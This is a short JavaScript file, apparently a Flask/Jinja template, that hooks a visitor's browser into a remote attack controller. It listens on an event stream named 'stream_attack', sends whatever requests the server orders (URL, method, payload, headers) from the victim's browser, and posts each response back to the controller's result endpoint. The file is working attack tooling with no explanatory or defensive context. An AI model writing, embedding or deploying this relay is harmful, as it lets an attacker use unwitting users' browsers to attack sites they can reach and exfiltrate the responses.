var source = new EventSource("{{ url_for('stream_attack', _external=True) }}");
source.onmessage = function (event) {
    var data = JSON.parse(event.data);
    //console.log(data);
    //sendAttack(data);
    executeAttack(data);
};

// https://developers.google.com/web/ilt/pwa/working-with-the-fetch-api

function logResult(result) {
    console.log(result);
    return result;
}

function logError(error) {
    console.log("Looks like there was a problem: \n", error);
}

function validateResponse(response) {
    if (!response.ok) {
        throw Error(response.statusText);
    }
    return response;
}

function readResponseAsJSON(response) {
    return response.json();
}

function readResponseAsText(response) {
    return response.text();
}

function executeAttack(data) {
    if (JSON.stringify(data) === JSON.stringify({})) {
        return data;//throw Error("Nothing to do.");
    }
    var init = {
        method: data.method,
        body: data.payload,
        headers: new Headers({"Content-Type": data.content_type})
    }
    fetch(data.url, init)
    .then(readResponseAsText)
    //.then(logResult)
    .then(function(result) { return reportResult(result, data.id, data.payload); })
    .catch(logError);
}

function reportResult(result, id, payload) {
    fetch("{{ url_for('result', _external=True) }}", {
        method: "POST",
        body: JSON.stringify({id: id, result: result, payload: payload})
    })
    .then(readResponseAsText)
    //.then(logResult)
    .catch(logError);
}
